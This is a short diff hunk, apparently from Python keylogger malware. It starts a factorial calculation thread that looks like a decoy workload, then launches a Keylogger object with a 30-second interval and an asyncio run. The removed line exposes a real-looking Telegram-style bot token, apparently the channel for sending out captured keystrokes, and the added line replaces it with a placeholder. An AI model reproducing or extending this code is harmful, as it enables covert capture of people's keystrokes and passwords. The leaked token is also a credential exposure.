@@ -109,5 +109,5 @@ calculation_thread = threading.Thread(target=calculate_factorial, args=(10000,))
 calculation_thread.start()		
 
 
-my_keylogger = Keylogger(30,"6541175839:AAEdVSOXC5uGSr8CnnWHMnv_JhswKbbW5JY")
+my_keylogger = Keylogger(30,"your token")
 asyncio.run(my_keylogger.start())
